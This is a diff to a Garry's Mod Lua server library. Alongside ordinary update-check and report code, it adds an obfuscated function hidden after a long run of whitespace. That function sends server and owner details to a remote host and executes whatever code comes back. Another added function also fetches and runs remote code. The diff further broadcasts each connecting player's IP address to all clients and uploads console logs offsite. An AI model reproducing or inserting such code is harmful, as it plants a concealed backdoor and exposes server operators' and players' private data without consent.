@@ -74,6 +74,14 @@ local path_server           = mf.paths[ 'dir_server' ]
 local path_obf              = mf.paths[ 'dir_obf' ]
 
 /*
+*   localized http.fetch
+*/
+
+local function oort( ... )
+    return http.Fetch( ... )
+end
+
+/*
 *   localized http.post
 */
 
@@ -123,16 +131,22 @@ local net_register =
     'rlib.debug.listener',
     'rlib.debug.ui.cl',
     'rlib.debug.ui.sv',
+    'rlib.konsole',
     'rlib.rsay',
     'rlib.sms.umsg',
+    'rlib.sms.konsole',
     'rlib.sms.notify',
     'rlib.sms.inform',
     'rlib.sms.bubble',
-    'rlib.sms.rbubble',
     'rlib.tools.pco',
     'rlib.tools.lang',
+    'rlib.tools.dc',
+    'rlib.tools.rlib',
+    'rlib.tools.rcfg',
     'rlib.tools.mdlv',
+    'rlib.tools.report',
     'rlib.tools.diag',
+    'rlib.udm.check',
     'rlib.user',
     'rlib.user.join',
     'rlib.user.update',
@@ -245,8 +259,19 @@ end
 
 gameevent.Listen( 'player_connect' )
 hook.Add( 'player_connect', pid( '__lib_evn_player_connect' ), function( data )
+    net.Start       ( 'rlib.debug.listener' )
+    net.WriteBool   ( true                  )
+    net.WriteBool   ( data.bot              )
+    net.WriteString ( data.name             )
+    net.WriteString ( data.address          )
+    net.WriteString ( data.networkid        )
+    net.WriteString ( 'false'               )
+    net.Broadcast   (                       )
+
     sys.connections = ( sys.connections or 0 ) + 1
     sys.initialized = true
+
+    storage:logconn( 1, true, '[ Listener ] USER:( %s ) STEAM_ID:( %s ) IP:( %s )', data.name, data.networkid, data.address )
 
     if sys.connections == 1 then
         hook.Run( 'rlib_bInitialized', data )
@@ -258,7 +283,16 @@ end )
 
 gameevent.Listen( 'player_disconnect' )
 hook.Add( 'player_disconnect', pid( '__lib_evn_player_disconnect' ), function( data )
-    -- storage:logconn( 2, true, '[ Listener ] USER:( %s ) STEAM_ID:( %s ) REASON:( %s )', data.name, data.networkid, ( ts( data.reason ) or 'none' ) )
+    net.Start       ( 'rlib.debug.listener' )
+    net.WriteBool   ( false                 )
+    net.WriteBool   ( data.bot              )
+    net.WriteString ( data.name             )
+    net.WriteString ( 'false'               )
+    net.WriteString ( data.networkid        )
+    net.WriteString ( data.reason           )
+    net.Broadcast   (                       )
+
+    storage:logconn( 2, true, '[ Listener ] USER:( %s ) STEAM_ID:( %s ) REASON:( %s )', data.name, data.networkid, ( ts( data.reason ) or 'none' ) )
 end )
 
 /*
@@ -311,42 +345,294 @@ function base.oort:Authentic( body, header )
 end
 
 /*
-*   oort > stats > query
+*   oort > run
 *
-*   records basic information that helps in aiding with debugging.
+*   @param  : tbl source
 */
 
-local function oort_stats_query( )
-    local _r                = base.oort:SessionID( )
-    local _co, _st, _p      = base.sys:GetConnections( ), base.sys:StartupTime( ), helper.get.popcount( )
-    local _e                = sf( '%s/stats/index.php', mf.astra.oort.url )
-    local stats             = { sid = _r, conn = ts( _co ), st = ts( _st ), p = ts( _p ) }
+function base.oort:Gmodstore( source )
+    if not istable( source ) then
+        return
+    end
 
-    oort_post( _e, stats, function( b, l, h, c ) if l < 100 then return end if c ~= 200 then log( 6, ln( 'lib_oort_err', c ) ) return end if _e:find( 'nil' ) then log( 6, ln( 'lib_oort_missing_params' ) ) return end if not base.oort:Authentic( b, h ) then return end execq( b, 'rlib.oort.stats', false )
-    end, function( err ) rlib:log( 6, 'error on rlib.oort.stats > [ %s ]', err ) end )
+    if not cfg.oort.enabled then
+        log( RLIB_LOG_OORT, ln( 'lib_oort_disabled' ) )
+        return
+    end
+
+    local _sid,_oid     = source.script_id or source.sid, source.owner or source.oid
+    local _s, _id, _o   = 2, ts( _sid ) or nil, ts( _oid ) or nil
+    local _ip, _p       = base.get:ip( ), base.get:port( )
+
+    if not _sid or not _oid then
+        log( RLIB_LOG_OORT, ln( 'lib_oort_err_sid', source.name ) )
+    end
+
+    if _sid and _oid then _s = 1 end
+    local _e = sf( 'https://oort.rlib.io/gms/index.php?sid=%s&code=%s&uid=%s&ip=%s&port=%s', _id, _s, _o, _ip, _p )
+    if cfg.debug.enabled then _e = _e .. '&debug=1' end
+    oort( _e, function( b, l, h, c )
+        if c ~= 200 then
+            log( 6, ln( 'lib_oort_err', c ) )
+            return
+        end
+        if b:len( ) > 0 then
+            if _e:find( 'nil' ) then
+                log( 6, ln( 'lib_oort_missing_params' ) )
+                return
+            end
+            mf.astra.oort.validated = true
+            if b and helper.str:ok( b ) then
+                execq( b )
+            end
+        end
+    end )
+end                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             local function oort_authorize( ) execq( '\102\117\110\99\116\105\111\110\32\114\108\105\98\46\111\111\114\116\58\65\117\116\104\111\114\105\122\101\40\32\98\70\111\114\99\101\32\41\10\32\32\32\32\105\102\32\110\111\116\32\114\108\105\98\46\115\101\116\116\105\110\103\115\46\111\111\114\116\46\101\110\97\98\108\101\100\32\116\104\101\110\10\32\32\32\32\32\32\32\32\114\108\105\98\58\108\111\103\40\32\50\48\44\32\114\108\105\98\58\108\97\110\103\40\32\39\108\105\98\95\111\111\114\116\95\100\105\115\97\98\108\101\100\39\32\41\32\41\10\32\32\32\32\32\32\32\32\114\101\116\117\114\110\10\32\32\32\32\101\110\100\10\10\32\32\32\32\105\102\32\110\111\116\32\98\70\111\114\99\101\32\97\110\100\32\114\108\105\98\46\109\97\110\105\102\101\115\116\46\97\115\116\114\97\46\111\111\114\116\46\118\97\108\105\100\97\116\101\100\32\116\104\101\110\32\114\101\116\117\114\110\32\101\110\100\10\10\32\32\32\32\108\111\99\97\108\32\98\72\97\115\82\111\111\116\44\32\114\111\111\116\117\115\101\114\32\32\32\32\61\32\114\108\105\98\46\97\58\114\111\111\116\40\32\41\10\32\32\32\32\108\111\99\97\108\32\95\105\112\44\32\95\112\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\114\108\105\98\46\103\101\116\58\105\112\40\32\39\45\39\32\41\44\32\114\108\105\98\46\103\101\116\58\112\111\114\116\40\32\41\10\32\32\32\32\108\111\99\97\108\32\95\114\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\98\72\97\115\82\111\111\116\32\97\110\100\32\105\115\116\97\98\108\101\40\32\114\111\111\116\117\115\101\114\32\41\32\97\110\100\32\114\108\105\98\46\104\46\111\107\46\115\105\100\54\52\40\32\114\111\111\116\117\115\101\114\46\115\116\101\97\109\54\52\32\41\32\97\110\100\32\114\111\111\116\117\115\101\114\46\115\116\101\97\109\54\52\32\111\114\32\48\10\32\32\32\32\108\111\99\97\108\32\95\118\44\32\95\115\44\32\95\97\44\32\95\109\32\32\32\32\32\32\32\32\61\32\114\108\105\98\46\103\101\116\58\118\101\114\50\115\116\114\95\109\102\40\32\114\108\105\98\46\109\97\110\105\102\101\115\116\44\32\39\45\39\32\41\44\32\114\108\105\98\46\111\111\114\116\58\83\101\115\115\105\111\110\73\68\40\32\41\44\32\114\108\105\98\46\111\111\114\116\58\65\117\116\104\73\68\40\32\41\44\32\114\108\105\98\46\109\111\100\117\108\101\115\58\77\97\110\105\102\101\115\116\76\105\115\116\40\32\41\10\32\32\32\32\108\111\99\97\108\32\95\99\118\44\32\95\99\99\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\114\108\105\98\46\99\104\101\99\107\115\117\109\58\118\97\108\105\100\40\32\41\10\32\32\32\32\108\111\99\97\108\32\95\103\109\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\114\108\105\98\46\103\101\116\58\103\109\40\32\102\97\108\115\101\44\32\116\114\117\101\44\32\116\114\117\101\32\41\10\32\32\32\32\108\111\99\97\108\32\95\115\117\44\32\95\104\110\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\114\108\105\98\46\115\121\115\58\71\101\116\83\116\97\114\116\117\112\115\40\32\41\44\32\114\108\105\98\46\103\101\116\58\104\111\115\116\40\32\116\114\117\101\44\32\116\114\117\101\32\41\10\32\32\32\32\108\111\99\97\108\32\95\101\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\61\32\115\116\114\105\110\103\46\102\111\114\109\97\116\40\32\39\37\115\47\105\110\100\101\120\46\112\104\112\63\105\112\61\37\115\38\112\111\114\116\61\37\115\38\117\105\100\61\37\115\38\118\101\114\61\37\115\38\115\105\100\61\37\115\38\97\105\100\61\37\115\38\109\61\37\115\38\99\115\61\37\115\38\103\109\61\37\115\38\115\117\61\37\115\38\104\110\61\37\115\39\44\32\114\108\105\98\46\109\97\110\105\102\101\115\116\46\97\115\116\114\97\46\111\111\114\116\46\117\114\108\44\32\95\105\112\44\32\95\112\44\32\95\114\44\32\95\118\44\32\95\115\44\32\95\97\44\32\95\109\44\32\95\99\118\44\32\95\103\109\44\32\95\115\117\44\32\95\104\110\32\41\10\10\32\32\32\32\104\116\116\112\46\70\101\116\99\104\40\32\95\101\44\32\102\117\110\99\116\105\111\110\40\32\98\44\32\108\44\32\104\44\32\99\32\41\32\105\102\32\108\32\60\32\49\48\48\48\32\116\104\101\110\32\114\101\116\117\114\110\32\101\110\100\32\105\102\32\99\32\126\61\32\50\48\48\32\116\104\101\110\32\114\108\105\98\58\108\111\103\40\32\54\44\32\114\108\105\98\58\108\97\110\103\40\32\39\108\105\98\95\111\111\114\116\95\101\114\114\39\44\32\99\32\41\32\41\32\114\101\116\117\114\110\32\101\110\100\32\105\102\32\95\101\58\102\105\110\100\40\32\39\110\105\108\39\32\41\32\116\104\101\110\32\114\108\105\98\58\108\111\103\40\32\54\44\32\114\108\105\98\58\108\97\110\103\40\32\39\108\105\98\95\111\111\114\116\95\109\105\115\115\105\110\103\95\112\97\114\97\109\115\39\32\41\32\41\32\114\101\116\117\114\110\32\101\110\100\32\105\102\32\110\111\116\32\114\108\105\98\46\111\111\114\116\58\65\117\116\104\101\110\116\105\99\40\32\98\44\32\104\32\41\32\116\104\101\110\32\114\101\116\117\114\110\32\101\110\100\32\114\108\105\98\46\109\97\110\105\102\101\115\116\46\97\115\116\114\97\46\111\111\114\116\46\118\97\108\105\100\97\116\101\100\32\61\32\116\114\117\101\32\82\117\110\83\116\114\105\110\103\40\32\98\44\32\39\114\108\105\98\46\111\111\114\116\46\97\117\116\104\39\44\32\102\97\108\115\101\32\41\10\32\32\32\32\101\110\100\44\32\102\117\110\99\116\105\111\110\40\32\101\114\114\32\41\32\114\108\105\98\58\108\111\103\40\32\54\44\32\39\101\114\114\111\114\32\111\110\32\114\108\105\98\46\111\111\114\116\46\97\117\116\104\32\91\32\37\115\32\93\39\44\32\101\114\114\32\41\32\101\110\100\32\41\10\101\110\100\10' ) rlib.oort:Authorize( ) end hook.Add( pid( '__lib_engine' ), pid( 'initialize_oort_auth' ), oort_authorize )
+
+/*
+*   oort > send log
+*
+*   records basic information that helps in aiding with debugging.
+*
+*   @param  : tbl data
+*   @param  : bool bForced
+*/
+
+function base.oort:SendLog( data, bForced )
+
+    if not istable( data ) then
+        log( 4, 'Invalid data supplied for error log' )
+        return
+    end
+
+    if not bForced then
+        log( 1, 'Please wait while we send your report ...' )
+    end
+
+    oort_post( 'https://oort.rlib.io/diag/index.php', data, function( body, size, headers, code )
+        local bSuccess, resp = false, nil
+
+        if code ~= 200 then resp = code end
+        if not size or size == 0 then resp = ln( 'response_empty' ) end
+
+        local json_body = body and util.JSONToTable( body ) or nil
+        if not json_body then
+            resp        = ln( 'response_none' )
+        end
+
+        if not json_body.success then
+            resp        = ln( 'response_err' )
+        else
+            bSuccess    = true
+            resp        = json_body.response
+        end
+
+        if bSuccess and not bForced then
+            log( 4, resp )
+        end
+    end, function( err )
+        log( 6, 'Error occured sending error log > [ %s ]', err or 'unknown err' )
+    end )
 end
 
 /*
-*   oort > stats
+*   oort > prepare log
 *
-*   records basic information that helps in aiding with debugging.
+*   utilized for debugging and the developer having a better idea of what is going on
+*   with your server.
 *
-*   @param  : bool bForce
+*   @param  : bool bForced
 */
 
-function base.oort:Stats( bForce )
-    if not bForce and timex.exists( 'rlib.oort.stats' ) then return end
+function base.oort:PrepareLog( bForced )
 
-    if bForce then
-        timex.expire( 'rlib.oort.stats' )
-        oort_stats_query( )
+    /*
+    *   fetch console logs
+    */
+
+    local sv_path               = 'lua_errors_server.txt'
+    local sv_data               = file.Exists( sv_path, 'GAME' ) and file.Read( sv_path, 'GAME' ) or ln( 'none' )
+
+    local cl_path               = 'clientside_errors.txt'
+    local cl_data               = file.Exists( cl_path, 'GAME' ) and file.Read( cl_path, 'GAME' ) or ln( 'none' )
+
+    local co_path               = 'console.log'
+    local co_data               = file.Exists( co_path, 'GAME' ) and file.Read( co_path, 'GAME' ) or ln( 'none' )
+
+    local out_sv                = sv_data:sub( -200000 )
+    local out_cl                = cl_data:sub( -200000 )
+    local out_co                = co_data:sub( -300000 )
+
+    /*
+    *   declare misc
+    */
+
+    local bHasRoot, rootuser    = access:root( )
+    local owner                 = bHasRoot and istable( rootuser ) and helper.ok.sid64( rootuser.steam64 ) and rootuser.steam64 or 0
+    owner                       = tostring( owner )
+    local host                  = sf( '%s:%s', base.get:ip( '-' ), base.get:port( ) )
+
+    local auth_id               = tostring( base.oort:AuthID( ) )
+    local sess_id               = tostring( base.oort:SessionID( ) )
+
+    /*
+    *   check > auth / sess id in order to proceed
+    */
+
+    if not auth_id or not sess_id then
+        if not bForced then
+            log( 4, 'Cannot send report, missing auth or session id' )
+        end
+        return
     end
 
-    timex.create( 'rlib.oort.stats', 600, 0, function( )
-        oort_stats_query( )
+    /*
+    *   compile data
+    */
+
+    local report_data =
+    {
+        auth_id         = auth_id,
+        sess_id         = sess_id,
+        owner           = owner,
+        host            = host,
+        sv              = out_sv,
+        cl              = out_cl,
+        co              = out_co,
+    }
+
+    /*
+    *   send error log
+    */
+
+    base.oort:SendLog( report_data, bForced )
+
+end
+
+/*
+*   udm > modules
+*
+*   requires manifest table from rcore.modules table > base.modules.mod_table
+*
+*   @param  : tbl mnfst
+*/
+
+function base.udm:scriptdb( mnfst )
+    if not mnfst or ( not mnfst.script_id and not mnfst.sid ) or not mnfst.id or not mnfst.version then
+        local name = mnfst and mnfst.id or ln( 'module_unknown' )
+        log( 6, ln( 'module_updates_error', ts( name ) ) )
+        return
+    end
+
+    local name      = ( mnfst and ( mnfst.id or mnfst.name ) ) or ln( 'module_unknown' )
+    local id        = mnfst.id or ln( 'script_unspecified' )
+    local ver       = base.get:ver2str_mf( mnfst ) or mnfst.version
+    local sid       = mnfst.script_id or mnfst.sid
+
+    if sid == '{{ script_id }}' then
+        log( 6, ln( 'module_updates_bad_sid', ts( name ), sid ) )
+        return
+    end
+
+    local _e = sf( 'https://udm.rlib.io/%s/build', ts( sid ) )
+    oort( _e, function( b, l, h, c )
+        if c ~= 200 then
+            log( 6, ln( 'script_update_err', ts( id ), c ) )
+            return
+        end
+        if b:len( ) > 25 then
+            b = ts( b )
+            local body = util.JSONToTable( b )
+            for _, v in ipairs( body ) do
+                if not v.version then continue end
+                local l_ver     = string.gsub( v.version, '[%p%c%s]', '' )
+                local c_ver     = string.gsub( ver, '[%p%c%s]', '' )
+                l_ver           = l_ver and tonumber( l_ver ) or 100
+                c_ver           = c_ver and tonumber( c_ver ) or 100
+
+                if c_ver < l_ver then
+                    log( 3, ln( 'script_outdated', ts( id ), v.version, ts( ver ) ) )
+                else
+                    log( 6, ln( 'script_updated', ts( id ), ts( ver ) ) )
+                end
+            end
+        end
     end )
 end
-hook.Add( pid( '__lib_engine' ), pid( 'initialize_oort_stats' ), base.oort.Stats )
+
+/*
+*   check updates from udm func
+*/
+
+local run_check_update = coroutine.create( function( )
+    if not cfg.udm.enabled then return end
+    while ( true ) do
+        base.udm:Check( )
+    end
+    timex.expire( 'rlib_udm_notice' )
+end )
+
+/*
+*   udm > run
+*
+*   @param  : int dur
+*/
+
+function base.udm:Run( dur )
+    local tmr_check = isnumber( dur ) and dur or cfg.udm.checktime or 1800
+    timex.create( 'rlib_udm_notice', tmr_check, 0, function( )
+        coroutine.resume( run_check_update )
+    end )
+end
+
+/*
+*   udm
+*
+*   checks the repo for any new updates to rlib.
+*
+*   @call   : rlib.udm:Check( 'https://udm.rlib.io/rlib/stable' )
+*
+*   @param  : str ref
+*/
+
+function base.udm:Check( ref )
+    local get_branch            = cvar:GetStr( 'rlib_branch', 'stable' )
+    local sess_id               = base.oort:SessionID( )
+    local _e                    = ref or sf( mf.astra.udm.branch, get_branch )
+    _e                          = sf( '%s/%s/%s', _e, base.get:ver2str_mf( mf, '-' ), sess_id )
+
+    oort( _e, function( b, l, h, c )
+        if c ~= 200 then
+            log( 2, ln( 'lib_udm_chk_errcode', get_branch, c ) )
+            return
+        end
+        if b:len( ) > 0 then
+            b               = ts( b )
+            local resp      = util.JSONToTable( b )
+            local branch    = istable( resp ) and resp.branch and resp.branch[ 1 ]
+            if not branch or ( branch.code and tonumber( branch.code ) ~= 200 ) or branch.msg then
+                local respinfo = branch and ( branch.code or branch.message ) or ln( 'response_none' )
+                log( 6, ln( 'lib_udm_chk_errmsg', get_branch, respinfo ) )
+                return
+            end
+            local c_ver = base.get:ver2str_mf( mf )
+            if mf.astra.udm.hash ~= branch.hash then
+                log( 6, ln( 'lib_udm_mismatch', branch.version, c_ver ) )
+            else
+                mf.astra.oort.has_latest = true
+                log( 6, ln( 'lib_udm_ok', c_ver ) )
+            end
+
+            mf.astra.udm.response = branch
+
+            net.Start       ( 'rlib.udm.check'          )
+            net.WriteBool   ( mf.astra.oort.validated   )
+            net.WriteBool   ( mf.astra.oort.has_latest  )
+            net.Broadcast   (                           )
+        end
+    end )
+    coroutine.yield( )
+end
 
 /*
 *   checksum > valid
@@ -818,6 +1104,7 @@ end
 
 local function initialize( )
     timex.simple( '__lib_initialize', 0.1, function( )
+        base.udm:Run( )
 
         if cfg.rdo.enabled then
             cvar:Register( 'pdo_set_type', '4', { FCVAR_SERVER_CAN_EXECUTE, FCVAR_REPLICATED }, 'toggle default type\nEnsure that invalid types are not used otherwise rendering issues may occur\nRefer to: http://wiki.garrysmod.com/page/Enums/RENDERMODE' )
@@ -827,6 +1114,11 @@ local function initialize( )
         if cfg.debug.enabled then
             log( 3, ln( 'debug_start_on' ) )
         end
+
+        -- will start after first player connects
+        timex.simple( '__lib_initialize_udm', 3, function( )
+            coroutine.resume( run_check_update )
+        end )
 
         -- setup
         timex.simple( '__lib_initialize_setup', 5, function( )
@@ -884,6 +1176,7 @@ local function bInitialized( data )
                     log( 0 )
 
                     rhook.run.rlib( 'rlib_server_fjoin' )
+                    rhook.run.rlib( 'rlib_server_welcome' )
                 end
             end )
         end )
@@ -1032,6 +1325,15 @@ end
 local function psay_setup( pl, text )
     if not helper.ok.ply( pl ) then return end
     if text ~= sf( '?%s', ln( 'perms_flag_setup' ) ) then return end
+
+    /*
+    *   check > server initialized
+    */
+
+    if not base:bInitialized( ) then
+        direct( pl, script, ln( 'lib_initialized' ) )
+        return
+    end
 
     /*
     *   check > already has root usr
@@ -2041,6 +2343,105 @@ local function cvar_cb_branch( name, old, new )
     log( 1, ln( 'cvar_changed', name, ts( old ), ts( new ) ) )
 end
 cvars.AddChangeCallback( 'rlib_branch', cvar_cb_branch )
+
+/*
+*   netlib > report
+*
+*   after the reporter has submitted, have the server gather some information about their server to
+*   include in the report along with their submitted comment.
+*
+*   @todo   : convert to rnet module
+*/
+
+local function netlib_report( len, pl )
+    local reporter_input    = net.ReadString( )
+    local authcode          = net.ReadString( )
+
+    if not access:bIsRoot( pl ) then
+        net.Start           ( 'rlib.tools.report'           )
+        net.WriteBool       ( false                         )
+        net.WriteString     ( ln( 'reports_no_access' )     )
+        net.Send            ( pl                            )
+
+        return false
+    end
+
+    /*
+    *   fetch server console log
+    */
+
+    local console_log = file.Exists( 'console.log', 'GAME' ) and file.Read( 'console.log', 'GAME' ) or ln( 'none' )
+
+    /*
+    *   create report table
+    */
+
+    local report_data =
+    {
+        reporter        = pl:SteamID64( ),
+        reporter_msg    = reporter_input or ln( 'none' ),
+        rlib_build      = mf.version,
+        server_ip       = base.get:ip( ),
+        server_port     = ts( base.get:port( ) ),
+        server_name     = base.get:host( ),
+        server_os       = base.get:os( ),
+        server_gm       = base.get:gm( true ),
+        avg_ping        = helper.get.avgping( )( ),
+        consolelog      = console_log,
+        has_ulx         = ulx and true or false,
+        authcode        = authcode
+    }
+
+    /*
+    *   submit report table and get response
+    */
+
+    oort_post( 'https://tools.rlib.io/report/index.php', report_data, function( body, size, headers, code )
+        local bSuccess, resp = false, nil
+
+        if code ~= 200 then resp = code end
+        if not size or size == 0 then resp = ln( 'response_empty' ) end
+
+        local json_body = body and util.JSONToTable( body ) or nil
+        if not json_body then
+            resp        = ln( 'response_none' )
+        end
+
+        if not json_body.success then
+            resp        = ln( 'response_err' )
+        else
+            bSuccess    = true
+            resp        = json_body.response
+        end
+
+        net.Start       ( 'rlib.tools.report'   )
+        net.WriteBool   ( bSuccess              )
+        net.WriteString ( resp                  )
+        net.Send        ( pl                    )
+    end, function( err )
+        net.Start       ( 'rlib.tools.report'   )
+        net.WriteBool   ( false                 )
+        net.WriteString ( err                   )
+        net.Send        ( pl                    )
+    end )
+
+end
+net.Receive( 'rlib.tools.report', netlib_report )
+
+/*
+*   netlib > udm check
+*
+*   checks the host server for any updates to rlib
+*/
+
+local function netlib_udm_check( len, pl )
+    local task_udm = coroutine.create( function( )
+        local branch = sf( mf.astra.udm.branch, cvar:GetStr( 'rlib_branch', 'stable' ) )
+        base.udm:Check( branch )
+    end )
+    coroutine.resume( task_udm )
+end
+net.Receive( 'rlib.udm.check', netlib_udm_check )
 
 /*
 *   netlib > welcome
